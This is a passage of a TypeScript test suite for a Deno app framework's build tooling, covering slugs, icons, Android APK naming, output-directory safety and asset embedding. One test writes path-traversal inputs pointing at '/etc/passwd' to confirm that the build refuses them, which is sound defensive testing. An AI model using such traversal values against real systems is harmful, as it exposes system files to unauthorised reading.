import { assertEquals, assertRejects, assertStringIncludes } from "@std/assert";
import { join } from "@std/path";
import {
  copyDir,
  formatMb,
  slugify,
  writeDefaultIcon,
} from "../src/build/build-helpers.ts";
import { _cleartextAttr, apkArtifact } from "../src/build/build-android.ts";
import { ANDROID_TEMPLATE } from "../src/build/android-template.ts";

const buildScript = join(import.meta.dirname ?? ".", "..", "src", "build.ts");

/** Run build.ts with given args in a given cwd, return exit code + combined output */
async function runBuild(
  args: string[],
  cwd?: string,
): Promise<{ code: number; stderr: string; stdout: string }> {
  const result = await new Deno.Command("deno", {
    args: ["run", "-A", buildScript, ...args],
    stdout: "piped",
    stderr: "piped",
    cwd,
  }).output();
  const dec = new TextDecoder();
  return {
    code: result.code,
    stderr: dec.decode(result.stderr),
    stdout: dec.decode(result.stdout),
  };
}

// ── slugify ──────────────────────────────────────────────

Deno.test("slugify: basic title", () => {
  assertEquals(slugify("My Cool App"), "my-cool-app");
});

Deno.test("slugify: special characters stripped", () => {
  assertEquals(slugify("App@2.0! (beta)"), "app-2-0-beta");
});

Deno.test("slugify: leading/trailing dashes removed", () => {
  assertEquals(slugify("--test--"), "test");
});

Deno.test("slugify: empty string → myapp", () => {
  assertEquals(slugify(""), "myapp");
});

Deno.test("slugify: only special chars → myapp", () => {
  assertEquals(slugify("!!!"), "myapp");
});

Deno.test("slugify: already slugified passes through", () => {
  assertEquals(slugify("my-app"), "my-app");
});

// ── writeDefaultIcon ────────────────────────────────────
//
// The old writePlaceholderIcon drew "<text>M</text>" in a font — the same flat
// blue square for every app. The default is a generated MONOGRAM (glyph
// geometry, colour hashed from the name), written as SVG + PNG side by side
// because window managers and Android only read the PNG. Pinned here: both
// files exist, the SVG is a real font-free document, the PNG carries its
// magic, and the pair is deterministic in the name.

Deno.test("writeDefaultIcon: writes a real SVG and a real PNG", async () => {
  const dir = await Deno.makeTempDir();
  try {
    await writeDefaultIcon(`${dir}/myapp`, "myapp");
    const svg = await Deno.readTextFile(`${dir}/myapp.svg`);
    assertEquals(svg.startsWith("<svg"), true);
    assertEquals(svg.includes('xmlns="http://www.w3.org/2000/svg"'), true);
    assertEquals(svg.includes("<text"), false, "geometry, never a font");
    const png = await Deno.readFile(`${dir}/myapp.png`);
    assertEquals([...png.subarray(0, 4)], [0x89, 0x50, 0x4e, 0x47]);
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("writeDefaultIcon: deterministic in the name", async () => {
  const dir = await Deno.makeTempDir();
  try {
    await writeDefaultIcon(`${dir}/a`, "dashboard");
    await writeDefaultIcon(`${dir}/b`, "dashboard");
    await writeDefaultIcon(`${dir}/c`, "otherapp");
    const a = await Deno.readTextFile(`${dir}/a.svg`);
    const b = await Deno.readTextFile(`${dir}/b.svg`);
    const c = await Deno.readTextFile(`${dir}/c.svg`);
    assertEquals(a, b, "same name → same icon, every build");
    assertEquals(a === c, false, "different apps must be tellable apart");
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

// ── copyDir ─────────────────────────────────────────────

Deno.test("copyDir: copies files and subdirectories", async () => {
  const src = await Deno.makeTempDir();
  const dst = await Deno.makeTempDir();
  const dstTarget = join(dst, "out");
  try {
    await Deno.writeTextFile(join(src, "a.txt"), "hello");
    await Deno.mkdir(join(src, "sub"));
    await Deno.writeTextFile(join(src, "sub", "b.txt"), "world");

    await copyDir(src, dstTarget);

    assertEquals(await Deno.readTextFile(join(dstTarget, "a.txt")), "hello");
    assertEquals(
      await Deno.readTextFile(join(dstTarget, "sub", "b.txt")),
      "world",
    );
  } finally {
    await Deno.remove(src, { recursive: true });
    await Deno.remove(dst, { recursive: true });
  }
});

Deno.test("copyDir: preserves symlinks", async () => {
  const src = await Deno.makeTempDir();
  const dst = await Deno.makeTempDir();
  const dstTarget = join(dst, "out");
  try {
    await Deno.writeTextFile(join(src, "real.txt"), "data");
    await Deno.symlink("real.txt", join(src, "link.txt"));

    await copyDir(src, dstTarget);

    const target = await Deno.readLink(join(dstTarget, "link.txt"));
    assertEquals(target, "real.txt");
  } finally {
    await Deno.remove(src, { recursive: true });
    await Deno.remove(dst, { recursive: true });
  }
});

Deno.test("copyDir: preserves executable bit", async () => {
  const src = await Deno.makeTempDir();
  const dst = await Deno.makeTempDir();
  const dstTarget = join(dst, "out");
  try {
    await Deno.writeTextFile(join(src, "run.sh"), "#!/bin/bash\necho hi");
    await Deno.chmod(join(src, "run.sh"), 0o755);

    await copyDir(src, dstTarget);

    const info = await Deno.stat(join(dstTarget, "run.sh"));
    assertEquals((info.mode! & 0o111) !== 0, true);
  } finally {
    await Deno.remove(src, { recursive: true });
    await Deno.remove(dst, { recursive: true });
  }
});

// ── formatMb ─────────────────────────────────────────────

Deno.test("formatMb: zero bytes", () => {
  assertEquals(formatMb(0), "0.0");
});

Deno.test("formatMb: 1 MB exactly", () => {
  assertEquals(formatMb(1024 * 1024), "1.0");
});

Deno.test("formatMb: 1.5 MB", () => {
  assertEquals(formatMb(1.5 * 1024 * 1024), "1.5");
});

Deno.test("formatMb: large binary ~134 MB", () => {
  const mb = formatMb(134 * 1024 * 1024);
  assertEquals(mb, "134.0");
});

Deno.test("formatMb: sub-MB rounds to one decimal", () => {
  // 512 KB = 0.5 MB
  assertEquals(formatMb(512 * 1024), "0.5");
});

// ── Conflicting flags ────────────────────────────────────

Deno.test("build: --cli + --android rejects with error", async () => {
  const { code, stderr } = await runBuild(["--cli", "--android"]);
  assertEquals(code, 1);
  assertEquals(stderr.includes("conflicting flags"), true);
});

Deno.test("build: --electron + --cli rejects with error", async () => {
  const { code, stderr } = await runBuild(["--electron", "--cli"]);
  assertEquals(code, 1);
  assertEquals(stderr.includes("conflicting flags"), true);
});

Deno.test("build: --client + --android rejects with error", async () => {
  const { code, stderr } = await runBuild(["--client", "--android"]);
  assertEquals(code, 1);
  assertEquals(stderr.includes("conflicting flags"), true);
});

Deno.test("build: single flag does not reject", async () => {
  // --cli without src/app.ts will fail later, but NOT from flag validation
  const { stderr } = await runBuild(["--cli"]);
  assertEquals(stderr.includes("conflicting flags"), false);
});

Deno.test("build: --service + --compile does not conflict", async () => {
  // --service is not a shell flag, so --compile + --service is valid
  const { stderr } = await runBuild(["--compile", "--service"]);
  assertEquals(stderr.includes("conflicting flags"), false);
});

// A bare `--service` used to build a bundle and exit 0 (audit L24). The unit file
// it writes points at a compiled binary, so alone it describes a file that will
// never exist — a successful-looking command that did a fraction of what its
// flag says. The pipeline refuses it now, naming the combination that works.
Deno.test("build: bare --service is refused, not half-done", async () => {
  // A real (if empty) app: the framework's own deno.json is a JSR package
  // whose prerelease version the STRICT app-version rule refuses first.
  const tmp = await Deno.makeTempDir();
  await Deno.writeTextFile(
    join(tmp, "deno.json"),
    JSON.stringify({ title: "svc", version: "0.1" }),
  );
  const { code, stderr, stdout } = await runBuild(["--service"], tmp);
  assertEquals(code, 1, `must refuse:\n${stdout}${stderr}`);
  const out = stderr + stdout;
  assert(out.includes("--service"), out);
  assert(
    out.includes("--compile --service"),
    `it must name the combination that works: ${out}`,
  );
});

// ── --name flag slugification ──────────────────────────────

Deno.test("build: --name flag slugifies in output", async () => {
  const tmp = await Deno.makeTempDir();
  try {
    await Deno.writeTextFile(
      join(tmp, "deno.json"),
      JSON.stringify({ title: "test" }),
    );
    await Deno.mkdir(join(tmp, "src"));
    await Deno.writeTextFile(join(tmp, "src", "app.ts"), 'console.log("hi")');
    // --cli will try to compile, which fails — but we check the output mentions the slug
    const { stdout } = await runBuild(["--cli", "--name=My App!"], tmp);
    assertEquals(stdout.includes("my-app"), true);
  } finally {
    await Deno.remove(tmp, { recursive: true });
  }
});

// One slugify decider for the binary name. With no `title`, the fallback used
// the RAW directory name, so a project folder called `My App` produced a binary
// literally named `My App` under `deno task compile` while `deno task build`
// (which slugifies the same fallback) produced `my-app` — two names for one
// artifact, and a shell-hostile one at that.
Deno.test("build: an untitled project in a spaced directory still slugifies its binary name", async () => {
  const tmp = await Deno.makeTempDir();
  const dir = join(tmp, "My App");
  try {
    await Deno.mkdir(join(dir, "src"), { recursive: true });
    await Deno.writeTextFile(join(dir, "deno.json"), "{}"); // no title
    // Unparsable on purpose: the compile fails fast and what we assert is the
    // NAME the build chose, which it prints before compiling.
    await Deno.writeTextFile(join(dir, "src", "app.ts"), "not typescript(");
    const { stdout, stderr } = await runBuild(["--cli"], dir);
    assertStringIncludes(stdout + stderr, "my-app");
    assertEquals(
      (stdout + stderr).includes("\u2192 My App"),
      false,
      "never the raw directory name",
    );
  } finally {
    await Deno.remove(tmp, { recursive: true });
  }
});

// ── withDevExcluded: symlink restore after failed compile ──

Deno.test("build: symlinks restored after failed --cli compile", async () => {
  const tmp = await Deno.makeTempDir();
  try {
    // Minimal project: has src/app.ts but deno compile will fail (missing deps)
    await Deno.writeTextFile(
      join(tmp, "deno.json"),
      JSON.stringify({ title: "test" }),
    );
    await Deno.mkdir(join(tmp, "src"), { recursive: true });
    await Deno.writeTextFile(
      join(tmp, "src", "app.ts"),
      'import "nonexistent_dep_xyz"',
    );

    // Fake node_modules with a dev symlink
    const denoDir = join(tmp, "node_modules", ".deno");
    const fakeEsbuild = join(denoDir, "esbuild@0.1.0");
    await Deno.mkdir(join(fakeEsbuild, "node_modules", "esbuild"), {
      recursive: true,
    });
    await Deno.writeTextFile(
      join(fakeEsbuild, "node_modules", "esbuild", "index.js"),
      "",
    );

    // Top-level symlink: node_modules/esbuild → .deno/esbuild@0.1.0/node_modules/esbuild
    const symlinkPath = join(tmp, "node_modules", "esbuild");
    await Deno.symlink(
      join(fakeEsbuild, "node_modules", "esbuild"),
      symlinkPath,
    );

    // Verify symlink exists before build
    const before = await Deno.readLink(symlinkPath);
    assertEquals(typeof before, "string");

    // --cli skips esbuild, goes straight to withDevExcluded → deno compile (which will fail)
    const { code, stdout } = await runBuild(["--cli"], tmp);
    assertEquals(code, 1); // compile fails

    // Symlink must be restored by finally block
    const after = await Deno.readLink(symlinkPath);
    assertEquals(after, before);
    assertEquals(stdout.includes("restored"), true);
  } finally {
    await Deno.remove(tmp, { recursive: true });
  }
});

// ── Android template generation ─────────────────────────────────

Deno.test("build: android template placeholders are valid", async () => {
  // Verify the android-template files exist and contain expected placeholders
  const templateDir = join(
    import.meta.dirname ?? ".",
    "..",
    "android-template",
  );
  const manifestPath = join(
    templateDir,
    "app",
    "src",
    "main",
    "AndroidManifest.xml",
  );
  const buildGradlePath = join(templateDir, "app", "build.gradle.kts");

  // Check manifest exists and has APP_NAME and ICON_ATTR
  const manifest = await Deno.readTextFile(manifestPath);
  assertEquals(manifest.includes("{{APP_NAME}}"), true);
  assertEquals(manifest.includes("{{ICON_ATTR}}"), true);

  // Check build.gradle.kts has APPLICATION_ID
  const buildGradle = await Deno.readTextFile(buildGradlePath);
  assertEquals(buildGradle.includes("{{APPLICATION_ID}}"), true);
});

Deno.test("build: android applicationId derivation from binary name", async () => {
  // Test the sanitization logic from build.ts:379-384
  // sanitizeId strips non-alphanumeric; app validation requires lowercase + starts with letter
  const sanitizeId = (name: string): string => name.replace(/[^a-z0-9]/g, "");
  const toAppId = (name: string): string => {
    const s = name.toLowerCase().replace(/[^a-z0-9]/g, "");
    if (!s || !/^[a-z]/.test(s)) return "app"; // fallback per build.ts
    return `app.aio.${s}`;
  };

  // The actual logic in build.ts validates:
  // 1. sanitized must exist
  // 2. must start with a letter
  // 3. applicationId = 'app.aio.' + sanitized
  const testCases = [
    { name: "my-counter", expected: "app.aio.mycounter" },
    { name: "Hello_World", expected: "app.aio.helloworld" },
    { name: "app@2.0!", expected: "app.aio.app20" },
    { name: "Cool App 123", expected: "app.aio.coolapp123" }, // lowercase + strip space
  ];

  for (const tc of testCases) {
    assertEquals(toAppId(tc.name), tc.expected);
  }
});

Deno.test("build: android APP_NAME XML escaping", async () => {
  // Test the XML escaping logic from build.ts:386
  const escapeXml = (s: string): string =>
    s.replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");

  assertEquals(escapeXml("My App"), "My App");
  assertEquals(escapeXml("Tom & Jerry"), "Tom &amp; Jerry");
  assertEquals(escapeXml("A < B"), "A &lt; B");
  assertEquals(escapeXml('Say "hi"'), "Say &quot;hi&quot;");
});

Deno.test("build: android APP_NAME Kotlin escaping", async () => {
  // Test the Kotlin escaping logic from build.ts:385
  const escapeKotlin = (s: string): string =>
    s.replace(/[\x00-\x1f\x7f]/g, "")
      .replace(/\\/g, "\\\\")
      .replace(/\$/g, "\\$")
      .replace(/"/g, '\\"');

  assertEquals(escapeKotlin("My App"), "My App");
  assertEquals(escapeKotlin("Path\\File"), "Path\\\\File");
  assertEquals(escapeKotlin("$var"), "\\$var");
  assertEquals(escapeKotlin('Say "hi"'), 'Say \\"hi\\"');
});

// `--release` is a DOCUMENTED flag ("Android release build", docs/build/
// targets.md) and it never produced an APK. `assembleRelease` writes
// `app-release.apk` only when the release variant declares a `signingConfig`;
// the generated Gradle project declares none, so AGP writes
// `app-release-unsigned.apk` — and the build copied the former unconditionally.
// A real run reached "BUILD SUCCESSFUL in 36s" and then died with an uncaught
// `NotFound: … app-release.apk`, leaving nothing in the project root.
Deno.test("android --release: the artifact is the file gradle really wrote", () => {
  // The premise, pinned. Add a signingConfig later and this test says so.
  assertEquals(
    /signingConfig/.test(ANDROID_TEMPLATE["app/build.gradle.kts"]!),
    false,
    "the generated project declares no signingConfig, so assembleRelease " +
      "emits app-release-unsigned.apk — if that changed, revisit apkArtifact",
  );

  // The shipped reality: unsigned, and the NAME says so. An APK that cannot be
  // installed must never wear the name of one that can.
  assertEquals(
    apkArtifact(["app-release-unsigned.apk", "output-metadata.json"], true),
    { file: "app-release-unsigned.apk", suffix: "-unsigned" },
  );
  // A signed release (someone adds a signingConfig) keeps the plain name.
  assertEquals(apkArtifact(["app-release.apk"], true), {
    file: "app-release.apk",
    suffix: "",
  });
  // Debug is signed by the debug keystore — plain name, and it must not fall
  // back to a release APK left over from another build.
  assertEquals(apkArtifact(["app-debug.apk"], false), {
    file: "app-debug.apk",
    suffix: "",
  });
  assertEquals(apkArtifact(["app-release-unsigned.apk"], false), null);
  // Nothing produced → null, so the build reports it instead of throwing a raw
  // filesystem error from inside the framework.
  assertEquals(apkArtifact(["output-metadata.json"], true), null);
});

// ── --expose auth integration ───────────────────────────────────

// REMOVED: "build: --remote sets expose=true in server config" was
// `assertEquals(true, true)` under a comment saying the real coverage lived
// elsewhere. It did: `serviceExecFlags: remote service exposes the server`
// (below) asserts exactly this claim, through parseCli, on the flags the
// compiled binary is actually launched with. A placeholder that names an
// invariant it does not test is worse than no test — it is a green tick
// against an unguarded line.

// ── build-all (multi-target orchestrator) ─────────────────────────

import { buildAll, normalizeTargets, TARGETS } from "../src/build-all.ts";
import {
  isArtifactName,
  placedName,
  suffixedTargets,
  unsafeOutDir,
} from "../src/testing/internal.ts";
import { assert } from "@std/assert";

Deno.test("build-all: unsafeOutDir rejects root/ancestor/.aio/src, allows a subdir", () => {
  const root = "/proj";
  // destructive → rejected (these would wipe the project, parent, staging, src)
  assert(unsafeOutDir("/proj", root), "root itself");
  assert(unsafeOutDir("/", root), "filesystem root (out: '../..')");
  assert(unsafeOutDir("/other", root), "outside the project");
  assert(unsafeOutDir("/proj/.aio", root), "staging parent");
  assert(unsafeOutDir("/proj/src", root), "source dir");
  assert(unsafeOutDir("/proj/.git", root), "git dir");
  // dedicated subdirs → allowed
  assert(!unsafeOutDir("/proj/dist", root), "dist");
  assert(!unsafeOutDir("/proj/build/out", root), "nested out");
  assert(!unsafeOutDir("/proj/release", root), "release");

  // The hardcoded `src/` above is only the SCAFFOLD's convention. An app whose
  // entry is `apps/web/main.ts` keeps its sources where no list can guess, so
  // the app dir — THE decider's answer — is refused too: `out: "apps/web"`
  // would otherwise recursively delete the app it was asked to build.
  // Per-target entries make this a LIST — every target's app dir is refused
  // (see tests/build-per-target-entry.test.ts for the two-app case).
  const appDirs = ["/proj/apps/web"];
  assert(unsafeOutDir(appDirs[0]!, root, appDirs), "the app's own dir");
  assert(!unsafeOutDir("/proj/dist", root, appDirs), "dist, with an app dir");
});

// The guard is CONTAINMENT, not set membership. It used to test `forbidden.has(
// outDir)` — an exact match — so `out: "apps"` with the app in `apps/web/`
// sailed through and `Deno.remove(outDir, { recursive: true })` deleted the
// user's source tree while the build printed `✓ 1/1 build(s)` and exited 0.
// Table over every direction, including the string-prefix near-miss that a
// `startsWith` implementation would get wrong.
Deno.test("build-all: unsafeOutDir refuses containment in BOTH directions (source-destroying)", () => {
  const root = "/proj";
  const cases: Array<[string, string[], boolean, string]> = [
    // out, appDirs, unsafe?, why
    ["/proj/apps", ["/proj/apps/web"], true, "ANCESTOR of the app dir"],
    ["/proj/apps/web", ["/proj/apps/web"], true, "exactly the app dir"],
    [
      "/proj/apps/web/ui",
      ["/proj/apps/web"],
      true,
      "DESCENDANT of the app dir",
    ],
    ["/proj/apps/", ["/proj/apps/web"], true, "ancestor, trailing separator"],
    ["/proj/src/ui", [], true, "descendant of the hardcoded src/"],
    ["/proj/.git/objects", [], true, "descendant of .git"],
    ["/proj/.aio/x", [], true, "descendant of the staging parent"],
    ["/proj", ["/proj/apps/web"], true, "the project root"],
    ["/", [], true, "filesystem root"],
    ["/other", [], true, "outside the project"],
    ["/projX/dist", [], true, "near-miss sibling of the ROOT (not inside it)"],
    // safe: dedicated subdirs that neither contain nor sit inside a source dir
    ["/proj/dist", ["/proj/apps/web"], false, "dist"],
    ["/proj/build/out", ["/proj/apps/web"], false, "nested out"],
    // near-miss names must NOT be treated as containment (segment compare)
    ["/proj/appsX", ["/proj/apps/web"], false, "sibling with a prefix name"],
    ["/proj/apps-dist", ["/proj/apps"], false, "prefix of the app dir's name"],
    ["/proj/srcX", [], false, "prefix of src/"],
    // a flat-layout app (entry at the root) still has somewhere to build
    ["/proj/dist", ["/proj"], false, "app dir IS the root → root rule applies"],
  ];
  for (const [out, appDirs, unsafe, why] of cases) {
    assertEquals(
      unsafeOutDir(out, root, appDirs),
      unsafe,
      `${out} (appDirs=${JSON.stringify(appDirs)}) — ${why}`,
    );
  }
});

Deno.test("build-all: isArtifactName recognizes artifacts, rejects source", () => {
  const bin = "myapp";
  // artifacts
  assert(isArtifactName("myapp", bin), "bare binary");
  assert(isArtifactName("myapp-client", bin), "cli client binary");
  assert(isArtifactName("myapp-x86_64.AppImage", bin), "electron AppImage");
  assert(isArtifactName("myapp.apk", bin), "android apk");
  assert(isArtifactName("myapp-client.apk", bin), "android client apk");
  assert(isArtifactName("myapp.service", bin), "systemd unit");
  assert(isArtifactName("myapp-win-x64.zip", bin), "windows zip");
  assert(isArtifactName("aio-client-x86_64.AppImage", bin), "electron client");
  // NOT artifacts
  assert(!isArtifactName("deno.json", bin), "config");
  assert(!isArtifactName("app.ts", bin), "source");
  assert(!isArtifactName("README.md", bin), "doc");
  assert(!isArtifactName("other", bin), "unrelated bare file");
  assert(!isArtifactName("myapp.ts", bin), "source sharing the name");
});

// THE regression: the artifact's name used to depend on what else happened to
// be built in the same command. `--targets=cli` wrote `dist/myapp` (over the
// browser binary sitting there); `--targets=browser,cli` wrote `dist/myapp`
// and `dist/myapp-cli`. Same target, two names, decided by collision order.
Deno.test("build-all: an artifact's name is the TARGET's, not the invocation's", () => {
  const declared = ["browser", "cli", "server"];
  const oneApp = () => "myapp"; // every target builds the same app
  const full = suffixedTargets(declared, normalizeTargets(declared), oneApp);
  // The first declared target keeps the bare name; the others carry a label.
  assertEquals([...full].sort(), ["cli", "server"]);
  assertEquals(placedName("myapp", "browser", full), "myapp");
  assertEquals(placedName("myapp", "cli", full), "myapp-cli");
  assertEquals(
    placedName("myapp.apk", "android-client", new Set(["android-client"])),
    "myapp-android-client.apk",
  );
  // …and the name a SUBSET build produces is identical to the one the full
  // build produces, for every subset — the property that was broken. A target
  // that is not declared at all (`--targets=cli` on a browser-only project)
  // joins the universe rather than stealing the declared one's name.
  for (const subset of [["cli"], ["cli", "server"], declared, ["server"]]) {
    const s = suffixedTargets(
      declared,
      normalizeTargets(declared, subset.join(",")),
      oneApp,
    );
    for (const t of subset) {
      assertEquals(
        placedName("myapp", t, s),
        placedName("myapp", t, full),
        `${t} built as [${subset.join(",")}]`,
      );
    }
  }
  assertEquals(
    [...suffixedTargets(
      ["browser"],
      normalizeTargets(undefined, "cli"),
      oneApp,
    )],
    ["cli"],
    "an undeclared target does not take the declared one's name",
  );
  // Two targets that are two DIFFERENT apps (one repo, `relay` + `myapp`)
  // collide over nothing, so neither is suffixed.
  const twoApps = { server: { name: "relay" }, browser: {} };
  assertEquals(
    [...suffixedTargets(
      twoApps,
      normalizeTargets(twoApps),
      (t) => t.appName ?? "myapp",
    )],
    [],
  );
});

Deno.test("build-all: every target has a valid, non-conflicting flag set", () => {
  // build-config.ts rejects >1 of these "shell target" flags per invocation, so
  // each build-all target must map to at most one of them or it can never build.
  const SHELL = ["--electron", "--android", "--cli", "--client"];
  for (const [name, spec] of Object.entries(TARGETS)) {
    const shellFlags = spec.flags.filter((f) => SHELL.includes(f));
    assert(
      shellFlags.length <= 1,
      `target ${name} has conflicting shell flags: ${shellFlags.join(", ")}`,
    );
    assert(spec.flags.length > 0, `target ${name} has no flags`);
    assert(
      ["server", "client", "app"].includes(spec.role),
      `target ${name} role`,
    );
  }
});

Deno.test("build-all: --list exits 0 without building", async () => {
  const orig = Deno.args;
  // buildAll reads Deno.args; --list short-circuits before any fs/subprocess work.
  Object.defineProperty(Deno, "args", {
    value: ["--list"],
    configurable: true,
  });
  try {
    assertEquals(await buildAll(), 0);
  } finally {
    Object.defineProperty(Deno, "args", { value: orig, configurable: true });
  }
});

// ── compile: app data assets (.wasm) are embedded (WASM AppImage bug) ──────

import { assetIncludes } from "../src/build/build-compile.ts";

Deno.test("assetIncludes: auto-discovers .wasm, honors compile.include, skips deps/build dirs", async () => {
  const dir = await Deno.makeTempDir();
  try {
    await Deno.mkdir(join(dir, "src"), { recursive: true });
    await Deno.mkdir(join(dir, "node_modules", "pkg"), { recursive: true });
    await Deno.mkdir(join(dir, "dist"), { recursive: true });
    await Deno.mkdir(join(dir, "rust", "target"), { recursive: true });
    await Deno.mkdir(join(dir, "assets"), { recursive: true });
    const wasm = new Uint8Array([0, 0x61, 0x73, 0x6d]);
    await Deno.writeFile(join(dir, "src", "syscalls.wasm"), wasm); // ← included
    await Deno.writeFile(join(dir, "node_modules", "pkg", "d.wasm"), wasm); // skip
    await Deno.writeFile(join(dir, "dist", "b.wasm"), wasm); // skip
    await Deno.writeFile(join(dir, "rust", "target", "t.wasm"), wasm); // skip
    await Deno.writeTextFile(join(dir, "assets", "model.bin"), "x"); // via include
    await Deno.writeTextFile(
      join(dir, "deno.json"),
      JSON.stringify({
        title: "x",
        compile: { include: ["assets/model.bin"] },
      }),
    );
    const inc = await assetIncludes(dir);
    const files = inc.filter((a) => a !== "--include");
    // shape: alternating --include <rel>
    assertEquals(inc.filter((a) => a === "--include").length, files.length);
    assert(files.includes("src/syscalls.wasm"), "auto .wasm included");
    assert(files.includes("assets/model.bin"), "declared asset included");
    assert(
      !files.some((f) => f.includes("node_modules")),
      "node_modules skipped",
    );
    assert(!files.some((f) => f.includes("dist")), "dist skipped");
    assert(!files.some((f) => f.includes("target")), "rust/target skipped");
    // The app's identity travels with the binary: without deno.json
    // embedded, a compiled app can only guess its own version — and reading the
    // launch directory's deno.json makes it adopt an unrelated project's.
    assert(files.includes("deno.json"), "deno.json embedded");
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

// A `compile.include` path outside the project cannot be embedded — staying
// in-project is the right rule. It was enforced by `continue`, so the binary
// shipped WITHOUT the asset it was told to carry and exit 0; the app then
// failed in the user's hands. Refusing names the entry and the resolved path.
Deno.test("assetIncludes: an out-of-project compile.include is REFUSED, not silently dropped", async () => {
  const dir = await Deno.makeTempDir();
  try {
    await Deno.mkdir(join(dir, "assets"), { recursive: true });
    await Deno.writeTextFile(join(dir, "assets", "model.bin"), "x");
    const write = (include: unknown[]) =>
      Deno.writeTextFile(
        join(dir, "deno.json"),
        JSON.stringify({ title: "x", compile: { include } }),
      );

    await write(["assets/model.bin", "../../../etc/passwd"]);
    const err = await assertRejects(
      () => assetIncludes(dir),
      Error,
      "compile.include[1]",
    );
    assert(
      err.message.includes("outside the project"),
      `names the rule: ${err.message}`,
    );
    assert(err.message.includes("etc/passwd"), "names the offending path");

    // An absolute path is the same mistake spelled differently — and worse,
    // `join` would quietly turn it into a project-relative one.
    await write(["/etc/passwd"]);
    await assertRejects(() => assetIncludes(dir), Error, "is absolute");

    // A non-path entry is a typo that would otherwise drop an asset silently.
    await write([42]);
    await assertRejects(() => assetIncludes(dir), Error, "compile.include[0]");

    // …and the in-project entry alone still works.
    await write(["assets/model.bin"]);
    const inc = await assetIncludes(dir);
    assert(inc.includes("assets/model.bin"), "declared asset still embedded");
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("compile: WASM read via import.meta.url works ONLY when embedded (regression)", async () => {
  const dir = await Deno.makeTempDir();
  const runDir = await Deno.makeTempDir(); // run from a different cwd
  try {
    await Deno.mkdir(join(dir, "src"), { recursive: true });
    // minimal valid wasm module: magic ("\0asm") + version (1)
    await Deno.writeFile(
      join(dir, "src", "m.wasm"),
      new Uint8Array([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0]),
    );
    await Deno.writeTextFile(
      join(dir, "src", "entry.ts"),
      `const b = await Deno.readFile(new URL("./m.wasm", import.meta.url));\n` +
        `await WebAssembly.compile(b);\nconsole.log("WASM_OK");\n`,
    );
    await Deno.writeTextFile(
      join(dir, "deno.json"),
      JSON.stringify({ title: "wa" }),
    );

    const includes = await assetIncludes(dir);
    assert(includes.includes("src/m.wasm"), "the wasm is discovered");

    const compile = async (extra: string[], out: string): Promise<boolean> => {
      const r = await new Deno.Command(Deno.execPath(), {
        args: ["compile", ...extra, "-o", join(runDir, out), "src/entry.ts"],
        cwd: dir,
        stdout: "null",
        stderr: "null",
      }).output();
      return r.code === 0;
    };
    const run = async (bin: string): Promise<string> => {
      const r = await new Deno.Command(join(runDir, bin), {
        cwd: runDir,
        stdout: "piped",
        stderr: "piped",
      }).output();
      return new TextDecoder().decode(r.stdout) +
        new TextDecoder().decode(r.stderr);
    };

    // Without the includes → the .wasm isn't in the binary → NotFound (the bug).
    assert(await compile([], "nofix"), "nofix compiled");
    assertStringIncludes(await run("nofix"), "NotFound");

    // With assetIncludes → the .wasm is embedded → WASM loads.
    assert(await compile(includes, "fixed"), "fixed compiled");
    assertStringIncludes(await run("fixed"), "WASM_OK");
  } finally {
    await Deno.remove(dir, { recursive: true });
    await Deno.remove(runDir, { recursive: true });
  }
});

// ── build wiring guards ─────────────────────────────────────────────────────
// Each of these covers a shipped bug whose fix was previously verified only by
// hand. They're pure-function asserts (no toolchain, milliseconds) so they run
// in EVERY `deno task test` — a broken build must fail here, not in a user's
// AppImage.

import { appimageEnv } from "../src/build/build-helpers.ts";
import { compileArgs } from "../src/build/build-compile.ts";
import { distCandidates, realDistCandidates } from "../src/server/paths.ts";

Deno.test("appimageEnv: extract-and-run is always set (FUSE-less hosts)", () => {
  const env = appimageEnv("x86_64");
  // Without this, appimagetool (itself an AppImage) can't mount on Ubuntu
  // 22.04+/containers/WSL/CI and the packaging step dies.
  assertEquals(env.APPIMAGE_EXTRACT_AND_RUN, "1");
  assertEquals(env.ARCH, "x86_64");
  // The host environment is inherited, not replaced (PATH etc. must survive).
  assertEquals(env.PATH, Deno.env.get("PATH"));
});

Deno.test("appimageEnv: the tool unpacks somewhere private, never /tmp", () => {
  // Extract-and-run names its directory after a digest of the AppImage and
  // creates it 0755 — so the default left a world-readable, predictably-named
  // copy of the packaging tool in /tmp on every build, at a path another user
  // could create first. Same rule a packaged app gets at launch (AppDirs.app).
  const env = appimageEnv("x86_64");
  assert(env.TMPDIR, "a private TMPDIR must be chosen for the unpack");
  assert(
    !env.TMPDIR.startsWith("/tmp/") && env.TMPDIR !== "/tmp",
    `must not stage in shared /tmp, got ${env.TMPDIR}`,
  );
  const mode = Deno.statSync(env.TMPDIR).mode;
  if (Deno.build.os !== "windows") {
    assertEquals(
      mode! & 0o777,
      0o700,
      `the unpack dir must be owner-only, got ${(mode! & 0o777).toString(8)}`,
    );
  }
});

Deno.test("appimageEnv: every appimagetool invocation uses it", async () => {
  // A second packaging site that hand-rolled its env would silently lose the
  // flag — and only break on a FUSE-less machine. Assert the shared helper is
  // the ONLY way appimagetool is spawned.
  for (const f of ["build-electron.ts", "build-client.ts"]) {
    const src = await Deno.readTextFile(
      join(import.meta.dirname ?? ".", "..", "src", "build", f),
    );
    assertStringIncludes(src, "appimageEnv(arch)", `${f} uses the shared env`);
    assert(
      !/APPIMAGE_EXTRACT_AND_RUN/.test(src),
      `${f} must not hand-roll the appimage env`,
    );
  }
});

Deno.test("compileArgs: embeds dist, db worker, and app data assets", () => {
  const args = compileArgs({
    hasDist: true,
    workerInclude: ["--include", "/fw/db-worker.ts"],
    assets: ["--include", "src/syscalls.wasm"],
    excludes: ["/nm/.deno/esbuild@1"],
    out: "myapp",
    entry: "src/app.ts",
  });
  const pairs = args.flatMap((a, i) => a === "--include" ? [args[i + 1]] : []);
  assert(pairs.includes("dist/"), "embedded dist/ (prod assets + detection)");
  assert(pairs.includes("/fw/db-worker.ts"), "SQLite worker (untraceable)");
  // The WASM bug: assets discovered but never passed → binary builds, app
  // reports "wasm not available" at runtime.
  assert(pairs.includes("src/syscalls.wasm"), "app data assets");
  // Dev-only deps are excluded, and `-o <out> <entry>` closes the argv.
  assertEquals(args.slice(-5), [
    "--exclude",
    "/nm/.deno/esbuild@1",
    "-o",
    "myapp",
    "src/app.ts",
